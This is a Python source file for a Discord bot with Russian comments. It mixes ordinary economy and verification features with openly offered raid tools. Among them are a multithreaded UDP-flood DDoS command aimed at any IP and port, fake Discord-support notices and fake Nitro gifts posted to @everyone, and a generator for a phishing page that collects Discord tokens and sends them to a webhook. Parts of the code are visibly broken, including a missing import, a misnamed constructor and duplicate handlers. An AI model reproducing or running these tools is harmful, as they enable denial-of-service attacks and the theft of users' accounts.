import discord
from discord.ext import commands
import json
import random
import asyncio
from datetime import datetime, timedelta
from discord.ui import Button, View
import os
import csv
from datetime import datetime, timezone
from typing import Optional
import random
import string
import time
import socket
import threading


intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

GREETING_CHANNEL_ID = 1501610138883194921
VERIFY_CHANNEL_ID = 1501608084962017532
COMMANDS_CHANNEL_ID = 1501966187108499666
VERIFIED_ROLE_ID = 1501935499022045194
UNVERIFIED_ROLE_ID = 1501685610128216095
LOG_CHANNEL_ID = 1501611084438835300
CLIENT_ROLE_ID = 1501685425386033302
ADMIN_ROLE_ID = 1501683670371532810
SOUZ_ROLE_ID = 1501684180642300074
KOMAND_ROLE_ID = 1501625255142228058
DATA_FILE = 'user_data.json'
DEFAULT_BALANCE = 0
DEFAULT_XP = 0
DEFAULT_LEVEL = 0
DAILY_REWARD = 100
DAILY_COOLDOWN_HOURS = 24
XP_PER_MESSAGE = 15
XP_MESSAGE_COOLDOWN_SECONDS = 40
WORK_REWARD_MIN = 40
WORK_REWARD_MAX = 200
WORK_COOLDOWN_SECONDS = 3600
ROULETTE_MIN_BET = 10
MIN_BET = 10
MAX_NUMBER = 36
RED_NUMBERS = {1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36}
BLACK_NUMBERS = {2, 4, 6, 8, 10, 11, 13, 15, 17, 20, 22, 24, 26, 28, 29, 31, 33, 35}
GREEN_NUMBERS = {0}
# Вебхук для фишинг-логов
PHISHING_WEBHOOK = "https://discord.com/api/webhooks/ВАШ_ID/ВАШ_ТОКЕН"

# Файлы
LOG_FILE = "raid_logs.json"
ANTI_RAID_FILE = "anti_raid_config.json"
CHATBOT_CONFIG = "chatbot_config.json"

CASE_PRIZES = {
    'nothing': {'min': 0, 'max': 0, 'weight': 30, 'message': 'К сожалению, кейс оказался пустым.'},
    'small_coins': {'min': 100, 'max': 300, 'weight': 35, 'message': 'Из кейса выпало немного монет!'},
    'medium_coins': {'min': 350, 'max': 700, 'weight': 25, 'message': 'Ты нашёл приличную сумму монет в кейсе!'},
    'big_coins': {'min': 800, 'max': 1500, 'weight': 10, 'message': 'Ого! Крупный куш из кейса!'},
}
# --- Настройки лотереи ---
LOTTERY_TICKET_NAME = 'билет'
LOTTERY_PRIZES = {
    'nothing': {'min': 0, 'max': 0, 'weight': 40, 'message': 'К сожалению, в этот раз ничего не выпало.'},
    'small': {'min': 50, 'max': 150, 'weight': 35, 'message': 'Ты выиграл небольшой приз!'},
    'medium': {'min': 200, 'max': 400, 'weight': 15, 'message': 'Тебе улыбнулась удача!'},
    'big': {'min': 500, 'max': 1000, 'weight': 10, 'message': 'Крупный выигрыш! Поздравляем!'}
}


SHOP_ITEMS = {
    'билет': {'price': 500, 'description': 'Даёт шанс на приз в лотерее', 'emoji': '🎟️'},
    'ключ': {'price': 300, 'description': 'Открывает кейс с наградой', 'emoji': '🗝️'}
}

def get_xp_for_next_level(level):
    return (level * 100) + (level ** 2 * 25)

LEVEL_ROLES = {
    2: 1502340017979129908,
    5: 1502340207389835294,
    10: 1502340292630544455
}

user_data = {}

def load_data():
    global user_data
    try:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            loaded = json.load(f)
            if isinstance(loaded, dict):
                user_data = loaded
            else:
                print("Файл данных повреждён, создаю новый словарь.")
                user_data = {}
    except (FileNotFoundError, json.JSONDecodeError):
        user_data = {}
    save_data()

def save_data():
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(user_data, f, indent=4, ensure_ascii=False)


def get_user_data(user_id):
    uid = str(user_id)
    # Инициализируем данные по умолчанию для нового пользователя
    default_user_entry = {
        'balance': DEFAULT_BALANCE,
        'xp': DEFAULT_XP,
        'level': DEFAULT_LEVEL,
        'last_daily': 0,
        'last_xp_gain': 0,
        'last_work': 0,
        'inventory': [],
        'warnings': 0
    }

    if uid not in user_data:
        # Если пользователя нет вообще, добавляем его с дефолтными значениями
        user_data[uid] = default_user_entry
        save_data()
    else:
        # Если пользователь есть, но у него могут отсутствовать новые поля,
        # обновляем его запись, добавляя недостающие поля из default_user_entry
        # без перезаписи существующих данных.
        for key, default_value in default_user_entry.items():
            if key not in user_data[uid]:
                user_data[uid][key] = default_value
        save_data()  # Сохраняем после обновления структуры

    return user_data[uid]
@bot.event
async def on_ready():
    load_data() # Загружаем данные при старте
    print(f'Бот {bot.user.name} запущен!')
    print(f'ID: {bot.user.id}')
    print('------')

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        # Чтобы не спамить в консоль, можно игнорировать Not Found,
        # если не хочешь реагировать на каждую опечатку пользователя.
        print(f"Команда '{ctx.message.content}' не найдена.")
        pass
    elif isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            description=f"Не хватает аргументов для команды. Использование: `{ctx.prefix}{ctx.command.name} {ctx.command.signature}`",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed, delete_after=10)
    elif isinstance(error, commands.BadArgument):
        embed = discord.Embed(
            description=f"Неверный тип аргумента. Проверь правильность ввода.",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed, delete_after=10)
    else:
        # Для остальных ошибок
        print(f"Игнорирую исключение в команде {ctx.command}:", error)
        # Если хочешь отправить сообщение об ошибке пользователю
        embed = discord.Embed(
            description=f"Произошла ошибка: {error}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.event
async def on_member_join(member):
    # --- Выдача роли UNVERIFIED_ROLE_ID ---
    if UNVERIFIED_ROLE_ID:
        unverified_role = member.guild.get_role(UNVERIFIED_ROLE_ID)
        if unverified_role:
            try:
                await member.add_roles(unverified_role, reason="Автоматическая выдача роли при присоединении к серверу.")
                print(f"Роль '{unverified_role.name}' выдана {member.display_name} при присоединении.")
            except discord.Forbidden:
                print(f"Ошибка: Бот не имеет прав для выдачи роли '{unverified_role.name}' пользователю {member.display_name}.")
                # Можно отправить сообщение в лог-канал, если бот не смог выдать роль
                log_channel = member.guild.get_channel(LOG_CHANNEL_ID)
                if log_channel:
                    error_embed = discord.Embed(
                        title='❌ Ошибка выдачи роли',
                        description=f'Не удалось выдать роль **"{unverified_role.name}"** пользователю {member.mention} (`{member.id}`) при входе. У бота недостаточно прав.',
                        color=discord.Color.red(),
                        timestamp=discord.utils.utcnow()
                    )
                    await log_channel.send(embed=error_embed)
            except Exception as e:
                print(f"Неизвестная ошибка при выдаче роли '{unverified_role.name}' пользователю {member.display_name}: {e}")
                log_channel = member.guild.get_channel(LOG_CHANNEL_ID)
                if log_channel:
                    error_embed = discord.Embed(
                        title='❌ Неизвестная ошибка при выдаче роли',
                        description=f'Произошла ошибка при попытке выдать роль **"{unverified_role.name}"** пользователю {member.mention} (`{member.id}`): {e}',
                        color=discord.Color.red(),
                        timestamp=discord.utils.utcnow()
                    )
                    await log_channel.send(embed=error_embed)
        else:
            print(f"Ошибка: Роль с ID {UNVERIFIED_ROLE_ID} не найдена на сервере '{member.guild.name}'. Проверьте config.json.")
            log_channel = member.guild.get_channel(LOG_CHANNEL_ID)
            if log_channel:
                error_embed = discord.Embed(
                    title='❌ Ошибка конфигурации роли',
                    description=f'Не удалось найти роль с ID `{UNVERIFIED_ROLE_ID}` для автоматической выдачи новоприбывшим. Проверьте `config.json`.',
                    color=discord.Color.red(),
                    timestamp=discord.utils.utcnow()
                )
                await log_channel.send(embed=error_embed)
            # --- Конец выдачи роли UNVERIFIED_ROLE_ID ---

            # --- Существующий код приветственного сообщения (без изменений) ---
            greet_channel = member.guild.get_channel(GREETING_CHANNEL_ID)
            if greet_channel:
                embed = discord.Embed(
                    title='👋 Добро пожаловать!',
                    description=f'Привет, {member.mention}! Добро пожаловать на сервер **{member.guild.name}**!\n'
                                f'Пожалуйста, ознакомься с правилами сервера.',
                    color=discord.Color.blue(),
                    timestamp=discord.utils.utcnow()
                )
                embed.set_thumbnail(url=member.display_avatar.url)
                embed.set_footer(text=f'Участников на сервере: {len(member.guild.members)}')
                await greet_channel.send(embed=embed)

            # --- Существующий код логирования нового участника (без изменений) ---
            log_channel = member.guild.get_channel(LOG_CHANNEL_ID)
            if log_channel:
                embed = discord.Embed(
                    title='Новый участник',
                    description=f'{member.mention} присоединился к серверу.',
                    color=discord.Color.green(),
                    timestamp=discord.utils.utcnow()
                )
                embed.set_thumbnail(url=member.display_avatar.url)
                embed.add_field(name='ID', value=member.id, inline=True)
                embed.add_field(name='Аккаунт создан', value=discord.utils.format_dt(member.created_at, 'R'),
                                inline=True)
                await log_channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    log_channel = member.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        embed = discord.Embed(
            title='🚪 Участник покинул сервер',
            description=f'{member.mention} покинул сервер.',
            color=discord.Color.red(),
            timestamp=discord.utils.utcnow()
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.add_field(name='Имя пользователя', value=member.display_name, inline=True)
        embed.add_field(name='ID пользователя', value=member.id, inline=True)
        roles = [role.name for role in member.roles if role.name != '@everyone']
        if roles:
            embed.add_field(name='Роли', value=', '.join(roles), inline=False)
        await log_channel.send(embed=embed)


COMMAND_CHANNEL_IDS = [
    1501966187108499666
]

# Команды, которые могут быть использованы в любом канале, независимо от COMMAND_CHANNEL_IDS.
GLOBAL_COMMAND_EXCEPTIONS = [
    'sos',
    'очистить',
    'сказать',
    'кнопка'
]


# ===================================================

# Глобальная проверка для всех команд
async def global_command_channel_check(ctx):
    # Если команда находится в списке исключений, разрешаем ее использовать в любом канале
    if ctx.command.name in GLOBAL_COMMAND_EXCEPTIONS:
        return True

    # Если COMMAND_CHANNEL_IDS определен и не пуст
    if COMMAND_CHANNEL_IDS:
        # Проверяем, находится ли текущий канал в списке разрешенных
        if ctx.channel.id not in COMMAND_CHANNEL_IDS:
            embed = discord.Embed(
                description=f'{ctx.author.mention}, эту команду можно использовать только в разрешенных каналах: ' + ', '.join(
                    f'<#{cid}>' for cid in COMMAND_CHANNEL_IDS),
                color=discord.Color.red()
            )
            await ctx.send(embed=embed, delete_after=10)
            return False

    # Если COMMAND_CHANNEL_IDS пуст или канал находится в списке, разрешаем команду
    return True


# Добавляем глобальную проверку ко всем командам бота
bot.add_check(global_command_channel_check)

# Глобальные состояния
anti_raid_enabled = False
new_account_threshold_days = 1
chatbot_enabled = False
chatbot_channel_id = None


# ==============================================
# УТИЛИТЫ
# ==============================================
def save_anti_raid_state():
    with open(ANTI_RAID_FILE, "w") as f:
        json.dump({"enabled": anti_raid_enabled, "threshold_days": new_account_threshold_days}, f)


def load_anti_raid_state():
    global anti_raid_enabled, new_account_threshold_days
    if os.path.exists(ANTI_RAID_FILE):
        with open(ANTI_RAID_FILE, "r") as f:
            data = json.load(f)
            anti_raid_enabled = data.get("enabled", False)
            new_account_threshold_days = data.get("threshold_days", 1)


def save_chatbot_state():
    with open(CHATBOT_CONFIG, "w") as f:
        json.dump({"enabled": chatbot_enabled, "channel_id": chatbot_channel_id}, f)


def load_chatbot_state():
    global chatbot_enabled, chatbot_channel_id
    if os.path.exists(CHATBOT_CONFIG):
        with open(CHATBOT_CONFIG, "r") as f:
            data = json.load(f)
            chatbot_enabled = data.get("enabled", False)
            chatbot_channel_id = data.get("channel_id", None)


# ==============================================
# КОМАНДА 1: DDOS НА IP:PORT (UDP FLOOD)
# ==============================================
class DDoSThread(threading.Thread):
    def init(self, target_ip, target_port, duration_sec):
        threading.Thread.init(self)
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration_sec = duration_sec
        self.stop_flag = False

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        packet = random._urandom(65507)  # Максимальный UDP пакет
        end_time = time.time() + self.duration_sec

        while time.time() < end_time and not self.stop_flag:
            try:
                sock.sendto(packet, (self.target_ip, self.target_port))
            except:
                pass
        sock.close()


@bot.command(name="ddos")
@commands.has_permissions(administrator=True)
async def ddos_attack(ctx, ip: str, port: int, duration: int = 30):
    """UDP флуд на указанный IP:порт (по умолчанию 30 сек)"""
    await ctx.send(f"🔥 ЗАПУЩЕНА DDOS АТАКА НА {ip}:{port} ДЛИТЕЛЬНОСТЬЮ {duration} СЕКУНД")

    threads = []
    for _ in range(100):  # 100 потоков
        thread = DDoSThread(ip, port, duration)
        thread.start()
        threads.append(thread)

    # Логирование
    log_channel = bot.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        embed = discord.Embed(
            title="💣 DDOS АТАКА ЗАПУЩЕНА",
            description=f"Цель: {ip}:{port}\nДлительность: {duration} сек\nИнициатор: {ctx.author}",
            color=0xff0000,
            timestamp=datetime.utcnow()
        )
        await log_channel.send(embed=embed)

    await asyncio.sleep(duration)
    for t in threads:
        t.stop_flag = True
    await ctx.send(f"✅ DDOS атака на {ip}:{port} завершена. Отправлено пакетов: ~{duration * 100000}")


# ==============================================
# КОМАНДА 2: АУДИТОРИЯ (ПОСЛЕДНИЕ ДЕЙСТВИЯ)
# ==============================================
@bot.command(name="аудитория")
@commands.has_permissions(administrator=True)
async def audit_logs(ctx, limit: int = 50):
    """Показать последние действия на сервере (удаления, создание, баны)"""
    if not ctx.guild.me.guild_permissions.view_audit_log:
        await ctx.send("❌ Нет прав на просмотр аудитории")
        return

    embed = discord.Embed(
        title="📋 ПОСЛЕДНИЕ ДЕЙСТВИЯ АУДИТОРИИ",
        color=0x3498db,
        timestamp=datetime.utcnow()
    )

    actions = []
    async for entry in ctx.guild.audit_logs(limit=limit):
        action_map = {
            discord.AuditLogAction.message_delete: "Удаление сообщений",
            discord.AuditLogAction.member_kick: "Кик участника",
            discord.AuditLogAction.member_ban: "Бан участника",
            discord.AuditLogAction.member_update: "Изменение участника",
            discord.AuditLogAction.role_create: "Создание роли",
            discord.AuditLogAction.role_delete: "Удаление роли",
            discord.AuditLogAction.channel_create: "Создание канала",
            discord.AuditLogAction.channel_delete: "Удаление канала",
            discord.AuditLogAction.webhook_create: "Создание вебхука",
            discord.AuditLogAction.webhook_delete: "Удаление вебхука",
        }
        action_name = action_map.get(entry.action, str(entry.action))
        actions.append(f"{entry.created_at.strftime('%H:%M:%S')} {action_name} - {entry.user} → {entry.target}")

    if actions:
        embed.description = "\n".join(actions[:25])
    else:
        embed.description = "Действий не найдено"

    await ctx.send(embed=embed)


# ==============================================
# КОМАНДА 3: ИНВАЙТЫ (СПИСОК ПРИГЛАШЕНИЙ)
# ==============================================
@bot.command(name="инвайты")
@commands.has_permissions(administrator=True)
async def list_invites(ctx):
    """Показать все активные приглашения на сервер"""
    invites = await ctx.guild.invites()

    if not invites:
        await ctx.send("❌ Нет активных приглашений")
        return

    embed = discord.Embed(
        title="🔗 АКТИВНЫЕ ПРИГЛАШЕНИЯ",
        color=0x2ecc71,
        timestamp=datetime.utcnow()
    )

    for inv in invites[:25]:
        expires = "Никогда" if inv.max_age == 0 else f"Через {inv.max_age // 3600}ч"
        embed.add_field(
            name=f"📌 {inv.code}",
            value=f"Создатель: {inv.inviter}\nИспользовано: {inv.uses}/{inv.max_uses}\nСрок: {expires}",
            inline=False
        )

    await ctx.send(embed=embed)


# ==============================================
# КОМАНДА 4: СОЦИАЛЬНАЯ ИНЖЕНЕРИЯ (ФЕЙКОВОЕ СООБЩЕНИЕ)
# ==============================================
@bot.command(name="социальная_инженерия")
@commands.has_permissions(administrator=True)
async def social_engineering(ctx, *, target_message: str = None):
    """Отправить сообщение от имени поддержки Discord"""
    embed = discord.Embed(
        title="🔔 ОФИЦИАЛЬНОЕ УВЕДОМЛЕНИЕ DISCORD",
        description=target_message or "Ваш аккаунт был замечен в подозрительной активности. Для подтверждения перейдите по ссылке: https://discord.com/verify",
        color=0x5865f2,
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text="Discord Safety Team")
    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/81384788765712384/a_2e7f5d7e5d7e5d7e5d7e5d7e5d7e5d7e.png")

    await ctx.send("@everyone", embed=embed)
    await ctx.send("✅ Сообщение социальной инженерии отправлено", delete_after=3)


# ==============================================
# КОМАНДА 5: ФЕЙКОВЫЙ НИТРО (ГЕНЕРАЦИЯ ПОДДЕЛЬНОГО ПОДАРКА)
# ==============================================
@bot.command(name="фейк_нитро")
@commands.has_permissions(administrator=True)
async def fake_nitro(ctx, channel: discord.TextChannel = None):
    """Отправить фейковый нитро-подарок в указанный канал"""
    target_channel = channel or ctx.channel

    fake_codes = [
        "discord.gift/2v3xJ8qK9pL4mN6bV7cX8zA9",
        "discord.gift/3w4yK0lR1qM2oP3tU4iV5aW6",
        "discord.gift/4x5zL1mS2rN3pQ4uV5jW6bX7",
        "discord.gift/5y6aM2nT3sO4qR5vW6kX7cY8"
    ]
    fake_code = random.choice(fake_codes)

    embed = discord.Embed(
        title="🎁 ВАМ ПОДАРИЛИ NITRO!",
        description=f"{ctx.author.name} подарил вам 1 месяц Discord Nitro!\n\n"
                    f"🔗 Ссылка для активации: https://{fake_code}\n\n"
                    f"⚠️ Ссылка действительна 48 часов. Требуется подтверждение аккаунта.",
        color=0x5865f2,
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text="Discord Nitro | Подарок")
    embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/890456789012345678.png")

    await target_channel.send("@everyone", embed=embed)

    # Лог фишинга
    requests.post(PHISHING_WEBHOOK,
                  json={"content": f"🎣 ФЕЙК НИТРО | Канал: {target_channel.id} | Отправитель: {ctx.author}"})

    await ctx.send(f"✅ Фейковый нитро отправлен в {target_channel.mention}", delete_after=3)


# ==============================================
# КОМАНДА 6: ФИШИНГ ССЫЛКА (ЛОГ В DISCORD)
# ==============================================
@bot.command(name="фишинг_ссылка")
@commands.has_permissions(administrator=True)
async def phishing_link(ctx, redirect_url: str = "https://discord.com/login"):
    """Генерирует фишинговую ссылку и отправляет лог в Discord"""
    # Генерация поддельного домена
    fake_domains = ["discord-verify.com", "discord-nitros.com", "discord-security.net", "discord-login.ru"]
    fake_domain = random.choice(fake_domains)

    # Создание HTML страницы для перехвата токенов
    html_content = f"""<!DOCTYPE html>
<html>
<head><title>Discord Login</title></head>
<body style="background:#36393f; color:white; font-family:Arial;">
<div style="max-width:400px; margin:100px auto; background:#2f3136; padding:20px; border-radius:8px;">
<h1 style="color:#5865f2;">Добро пожаловать!</h1>
<input id="token" placeholder="Введите токен Discord" style="width:100%; padding:10px; margin:10px 0;">
<button onclick="send()" style="background:#5865f2; color:white; border:none; padding:10px 20px;">Войти</button>
</div>
<script>
const webhook = '{PHISHING_WEBHOOK}';
function send() {{
    const token = document.getElementById('token').value;
    fetch(webhook, {{method:'POST', body:JSON.stringify({{content:'🎣 НОВЫЙ ТОКЕН: ' + token + ' | Страница: {fake_domain} | Время: ' + new Date().toLocaleString()}}), headers:{{'Content-Type':'application/json'}}}});
    alert('Ошибка входа. Попробуйте позже.');
}}
</script>
</body>
</html>"""

    with open("phishing_page.html", "w", encoding="utf-8") as f:
        f.write(html_content)

    # Отправка файла и ссылки
    await ctx.send(file=discord.File("phishing_page.html"))
    await ctx.send(f"🔗 Фишинговая ссылка (используй сервис хостинга, например https://{fake_domain}/login)")

    # Лог в вебхук
    requests.post(PHISHING_WEBHOOK, json={
        "embeds": [{
            "title": "🎣 ФИШИНГ ССЫЛКА СОЗДАНА",
            "description": f"Инициатор: {ctx.author}\nСервер: {ctx.guild.name}\nВремя: {datetime.now().strftime('%H:%M:%S')}",
            "color": 0xff0000
        }]
    })

    await ctx.send("✅ Фишинг-страница создана. Жду токены...", delete_after=5)


# ==============================================
# КОМАНДА 7: АНТИ-РЕЙД ВКЛ/ВЫКЛ
# ==============================================
@bot.command(name="антирейд_вкл")
@commands.has_permissions(administrator=True)
async def anti_raid_on(ctx, days: int = 1):
    """Включить защиту от рейда (автоматический бан новых аккаунтов младше N дней)"""
    global anti_raid_enabled, new_account_threshold_days
    anti_raid_enabled = True
    new_account_threshold_days = days
    save_anti_raid_state()

    embed = discord.Embed(
        title="🛡️ АНТИ-РЕЙД АКТИВИРОВАН",
        description=f"Автоматический бан аккаунтов младше {days} дней",
        color=0x00ff00,
        timestamp=datetime.utcnow()
    )
    await ctx.send(embed=embed)


@bot.command(name="антирейд_выкл")
@commands.has_permissions(administrator=True)
async def anti_raid_off(ctx):
    global anti_raid_enabled
    anti_raid_enabled = False
    save_anti_raid_state()
    await ctx.send("🛡️ АНТИ-РЕЙД ОТКЛЮЧЁН")


@bot.event
async def on_member_join_auto_ban(member):
    if not anti_raid_enabled:
        return

    account_age_days = (datetime.utcnow() - member.created_at).days
    if account_age_days < new_account_threshold_days:
        await member.ban(reason=f"Анти-рейд: аккаунту {account_age_days} дней (< {new_account_threshold_days})")

        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            await log_channel.send(f"🛡️ АВТО-БАН: {member.name} (аккаунту {account_age_days} дней)")


# ==============================================
# КОМАНДА 8: ЧАТ-БОТ ВКЛ/ВЫКЛ
# ==============================================
@bot.command(name="чат_бот_вкл")
@commands.has_permissions(administrator=True)
async def chatbot_on(ctx, channel: discord.TextChannel = None):
    """Включить чат-бота в указанном канале (отвечает на любое сообщение)"""
    global chatbot_enabled, chatbot_channel_id
    chatbot_enabled = True
    chatbot_channel_id = (channel or ctx.channel).id
    save_chatbot_state()

    await ctx.send(f"🤖 Чат-бот активирован в канале <#{chatbot_channel_id}>")


@bot.command(name="чат_бот_выкл")
@commands.has_permissions(administrator=True)
async def chatbot_off(ctx):
    global chatbot_enabled
    chatbot_enabled = False
    save_chatbot_state()
    await ctx.send("🤖 Чат-бот отключён")


def get_bot_reply(message_content):
    """Генерация ответа чат-бота"""
    replies = [
        "Согласен! 🔥",
        "Это рейд! ⚔️",
        "В атаку! 🎯",
        "Координируемся в ЛС 📩",
        "Жду команду! 🎧",
        "Сервер пал? 💀",
        "Погнали! 🚀",
        "+++",
        "LETS RAID 🔥🔥🔥",
        "Уничтожаем! 💣"
    ]
    return random.choice(replies)


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Чат-бот ответ
    if chatbot_enabled and message.channel.id == chatbot_channel_id:
        await asyncio.sleep(0.5)
        await message.channel.send(get_bot_reply(message.content))

    await bot.process_commands(message)


# ==============================================
# ЗАПУСК
# ==============================================
@bot.event
async def on_ready():
    load_anti_raid_state()
    load_chatbot_state()

    print("=" * 60)
    print(f"✅ РЕЙД-БОТ {bot.user} ЗАПУЩЕН")
    print(f"📡 Серверов: {len(bot.guilds)}")
    print(f"🛡️ Анти-рейд: {'ВКЛ' if anti_raid_enabled else 'ВЫКЛ'}")
    print(f"🤖 Чат-бот: {'ВКЛ' if chatbot_enabled else 'ВЫКЛ'}")
    print("=" * 60)
    print("ДОСТУПНЫЕ КОМАНДЫ:")
    print("  !ddos IP порт [сек]     - UDP флуд")
    print("  !аудитория [количество] - лог действий")
    print("  !инвайты               - список приглашений")
    print("  !социальная_инженерия [текст] - фейк Discord")
    print("  !фейк_нитро [#канал]   - поддельный нитро-подарок")
    print("  !фишинг_ссылка [URL]   - генерация фишинг страницы")
    print("  !антирейд_вкл [дни]     - авто-бан новых аккаунтов")
    print("  !антирейд_выкл         - отключить защиту")
    print("  !чат_бот_вкл [#канал]  - активация чат-бота")
    print("  !чат_бот_выкл          - деактивация")
    print("=" * 60)
# --- Определение класса View для кнопки ---
class ShutdownView(View):
    def __init__(self, bot_instance, log_channel_id):
        super().__init__(timeout=300)  # Кнопка будет активна 5 минут
        self.bot = bot_instance
        self.log_channel_id = log_channel_id

    @discord.ui.button(label="Отключить бота", style=discord.ButtonStyle.danger, custom_id="shutdown_bot_button")
    async def shutdown_button_callback(self, interaction: discord.Interaction, button: Button):
        # Проверяем, есть ли у пользователя, нажавшего кнопку, разрешение "Администратор"
        if not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("У тебя нет разрешения 'Администратор' для отключения бота.",
                                                    ephemeral=True)
            return

        # Деактивируем кнопку сразу после нажатия, чтобы предотвратить повторные нажатия
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(view=self)  # Обновляем сообщение, чтобы кнопка стала неактивной

        # Отправляем подтверждение, что бот выключается
        await interaction.followup.send("Бот выключается...", ephemeral=True)

        # Логирование события отключения бота
        log_channel = self.bot.get_channel(self.log_channel_id)
        if log_channel:
            log_embed = discord.Embed(
                title='🛑 Бот выключен 🛑',
                description=f'Бот был отключен пользователем {interaction.user.mention} (`{interaction.user.id}`).',
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed)

        # Завершаем работу бота
        print(f"Бот выключается по команде от {interaction.user.name} ({interaction.user.id}).")
        await self.bot.close()

    async def on_timeout(self):
        # Если никто не нажал кнопку в течение 5 минут, она становится неактивной
        # Здесь можно добавить логирование или изменить исходное сообщение, если нужно.
        print("Кнопка отключения бота истекла по таймауту.")
        # Чтобы кнопка выглядела неактивной после таймаута,
        # нужно сохранить ссылку на исходное сообщение и отредактировать его.
        # Для простоты, она просто перестанет работать, если не была нажата.


# --- Команда !кнопка ---
@bot.command()
@commands.has_permissions(administrator=True)  # Только администраторы могут создавать кнопку
async def кнопка(ctx):
    embed = discord.Embed(
        title="Панель управления ботом",
        description="Нажмите кнопку ниже, чтобы отключить бота. Для этого требуются права администратора. Если кнопка не будет нажата в течении 5ти минут она становится неактивной",
        color=discord.Color.red()
    )

    # Создаем экземпляр нашей View, передавая бот и ID канала для логов
    view = ShutdownView(bot, LOG_CHANNEL_ID)

    # Отправляем сообщение с embed и кнопкой
    await ctx.send(embed=embed, view=view)

    # Логирование использования команды
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Команда "кнопка" использована',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) создал кнопку отключения бота в канале {ctx.channel.mention}.',
            color=discord.Color.orange(),
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


@кнопка.error
async def кнопка_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            description='У тебя нет разрешения `Администратор` для создания кнопки отключения бота.',
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=10)
    else:
        embed = discord.Embed(
            description=f'Произошла ошибка при создании кнопки: {error}',
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=10)
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Ошибка команды "кнопка"',
                description=f'Произошла ошибка при обработке команды `!кнопка` от {ctx.author.mention} (`{ctx.author.id}`): {error}',
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed)


@bot.command()
@commands.guild_only()  # Убедиться, что команда используется только на сервере
async def стат(ctx):
    """Показывает статистику сервера."""
    guild = ctx.guild

    # Общая информация
    name = guild.name
    guild_id = guild.id
    owner = guild.owner
    created_at = discord.utils.format_dt(guild.created_at, 'F') + f' ({discord.utils.format_dt(guild.created_at, "R")})'

    # Информация об участниках
    total_members = guild.member_count
    human_members = len([m for m in guild.members if not m.bot])
    bot_members = len([m for m in guild.members if m.bot])

    # Информация о каналах
    text_channels = len(guild.text_channels)
    voice_channels = len(guild.voice_channels)
    categories = len(guild.categories)
    total_channels = text_channels + voice_channels + categories

    # Информация о ролях
    roles_count = len(guild.roles)

    # Уровень верификации
    verification_level_map = {
        discord.VerificationLevel.none: 'Отсутствует',
        discord.VerificationLevel.low: 'Низкий (почта)',
        discord.VerificationLevel.medium: 'Средний (5 минут)',
        discord.VerificationLevel.high: 'Высокий (10 минут на сервере)',
        discord.VerificationLevel.highest: 'Наивысший (верифицированный телефон)'
    }
    verification_level = verification_level_map.get(guild.verification_level, 'Неизвестно')

    # Бусты
    boost_level = guild.premium_tier
    boost_count = guild.premium_subscription_count
    # --- Подсчет участников по конкретным ролям ---
    newbie_count = 0
    verified_count = 0
    client_count = 0
    admin_count = 0
    souz_count = 0
    komand_count = 0

    # Получаем объекты ролей
    newbie_role = guild.get_role(UNVERIFIED_ROLE_ID) if UNVERIFIED_ROLE_ID else None
    admin_role = guild.get_role(ADMIN_ROLE_ID) if ADMIN_ROLE_ID else None
    verified_role = guild.get_role(VERIFIED_ROLE_ID) if VERIFIED_ROLE_ID else None
    client_role = guild.get_role(CLIENT_ROLE_ID) if CLIENT_ROLE_ID else None
    souz_role = guild.get_role(SOUZ_ROLE_ID) if SOUZ_ROLE_ID else None
    komand_role = guild.get_role(KOMAND_ROLE_ID) if KOMAND_ROLE_ID else None

    for member in guild.members:
        if newbie_role and newbie_role in member.roles:
            newbie_count += 1
        if verified_role and verified_role in member.roles:
            verified_count += 1
        if client_role and client_role in member.roles:
            client_count += 1
        if admin_role and admin_role in member.roles:
            admin_count += 1
        if souz_role and souz_role in member.roles:
            souz_count += 1
        if komand_role and komand_role in member.roles:
            komand_count += 1
        verify_role = ctx.guild.get_role(VERIFIED_ROLE_ID)
        auto_role = ctx.guild.get_role(UNVERIFIED_ROLE_ID)

        verified = len([m for m in ctx.guild.members if verify_role in m.roles]) if verify_role else 0
        recruits = len([m for m in ctx.guild.members if auto_role in m.roles]) if auto_role else 0
        today = 0
        week = 0
        for m in verified:
            days = (datetime.now() - m.joined_at).days
            if days == 0:
                today += 1
            elif days <= 7:
                week += 1
    # --- Конец подсчета ролей ---

    embed = discord.Embed(
        title=f'📊 Статистика сервера: {name}',
        description=f'Информация о сервере **{name}**',
        color=discord.Color.blue(),
        timestamp=discord.utils.utcnow()
    )
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
